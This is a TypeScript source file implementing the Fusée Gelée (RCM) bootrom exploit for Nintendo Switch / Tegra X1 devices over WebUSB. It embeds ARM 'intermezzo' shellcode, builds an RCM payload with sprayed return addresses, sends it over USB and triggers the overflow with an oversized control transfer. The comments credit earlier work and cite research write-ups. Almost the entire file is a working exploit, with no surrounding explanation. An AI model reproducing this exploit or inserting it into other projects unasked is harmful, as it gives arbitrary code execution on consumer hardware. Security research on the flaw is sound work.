/**
 * Credit goes to: https://github.com/webrcm/webrcm.github.io for the WebUSB implementation
 * For more information on the exploit, see:
 *  - https://misc.ktemkin.com/fusee_gelee_nvidia.pdf
 *  - https://media.ccc.de/v/c4.openchaos.2018.06.glitching-the-switch
 *  - https://wejn.org/2022/05/understanding-the-nintendo-switch-boot-vulnerabilities/
 */

const INTERMEZZO = new Uint8Array([
  0x44, 0x00, 0x9f, 0xe5, 0x01, 0x11, 0xa0, 0xe3, 0x40, 0x20, 0x9f, 0xe5, 0x00, 0x20, 0x42, 0xe0, 0x08, 0x00, 0x00,
  0xeb, 0x01, 0x01, 0xa0, 0xe3, 0x10, 0xff, 0x2f, 0xe1, 0x00, 0x00, 0xa0, 0xe1, 0x2c, 0x00, 0x9f, 0xe5, 0x2c, 0x10,
  0x9f, 0xe5, 0x02, 0x28, 0xa0, 0xe3, 0x01, 0x00, 0x00, 0xeb, 0x20, 0x00, 0x9f, 0xe5, 0x10, 0xff, 0x2f, 0xe1, 0x04,
  0x30, 0x90, 0xe4, 0x04, 0x30, 0x81, 0xe4, 0x04, 0x20, 0x52, 0xe2, 0xfb, 0xff, 0xff, 0x1a, 0x1e, 0xff, 0x2f, 0xe1,
  0x20, 0xf0, 0x01, 0x40, 0x5c, 0xf0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40,
]);

const RCM_PAYLOAD_ADDRESS = 0x40010000;
const INTERMEZZO_LOCATION = 0x4001f000;

function createRCMPayload(payload: Uint8Array): Uint8Array {
  const rcmLength = 0x30298;

  const intermezzoAddressRepeatCount = (INTERMEZZO_LOCATION - RCM_PAYLOAD_ADDRESS) / 4;

  const rcmPayloadSize =
    Math.ceil((0x2a8 + 0x4 * intermezzoAddressRepeatCount + 0x1000 + payload.byteLength) / 0x1000) * 0x1000;

  const rcmPayload = new Uint8Array(new ArrayBuffer(rcmPayloadSize));
  const rcmPayloadView = new DataView(rcmPayload.buffer);

  rcmPayloadView.setUint32(0x0, rcmLength, true);

  for (let i = 0; i < intermezzoAddressRepeatCount; i++) {
    rcmPayloadView.setUint32(0x2a8 + i * 4, INTERMEZZO_LOCATION, true);
  }

  rcmPayload.set(INTERMEZZO, 0x2a8 + 0x4 * intermezzoAddressRepeatCount);
  rcmPayload.set(payload, 0x2a8 + 0x4 * intermezzoAddressRepeatCount + 0x1000);

  return rcmPayload;
}

function bufferToHex(data: DataView): string {
  const result = [];
  for (let i = 0; i < data.byteLength; i++) {
    result.push(data.getUint8(i).toString(16).padStart(2, '0'));
  }

  return result.join('');
}

async function write(dev: USBDevice, data: Uint8Array) {
  let length = data.length;
  let writeCount = 0;
  const packetSize = 0x1000;

  while (length) {
    const dataToTransmit = Math.min(length, packetSize);
    length -= dataToTransmit;

    const chunk = data.slice(0, dataToTransmit);
    data = data.slice(dataToTransmit);
    await dev.transferOut(1, chunk);
    writeCount++;
  }

  return writeCount;
}

/**
 * This works together with the main process to grant access to USB devices.
 */
export async function findRCMDevices(): Promise<USBDevice[]> {
  await navigator.usb.requestDevice({ filters: [] });
  return await navigator.usb.getDevices();
}

/**
 * Trigger the RCM vulnerability with WebUSB.
 * This doesn't support Windows platforms.
 */
export async function injectPayload(dev: USBDevice, payload: Uint8Array, logCallback: (text: string) => void) {
  await dev.open();
  logCallback(`Connected to ${dev.manufacturerName} ${dev.productName}`);

  await dev.claimInterface(0);

  const deviceID = await dev.transferIn(1, 16);
  logCallback(`Device ID: ${bufferToHex(deviceID.data)}`);

  const rcmPayload = createRCMPayload(payload);
  logCallback('Sending payload...');
  const writeCount = await write(dev, rcmPayload);
  logCallback('Payload sent!');

  if (writeCount % 2 !== 1) {
    logCallback('Switching to higher buffer...');
    await dev.transferOut(1, new ArrayBuffer(0x1000));
  }

  logCallback('Trigging vulnerability...');
  const vulnerabilityLength = 0x7000;
  await dev
    .controlTransferIn(
      {
        requestType: 'standard',
        recipient: 'interface',
        request: 0x00,
        value: 0x00,
        index: 0x00,
      },
      vulnerabilityLength
    )
    .catch(() => {
      /* ignored because the Switch doesn't respond to this packet */
    });
}
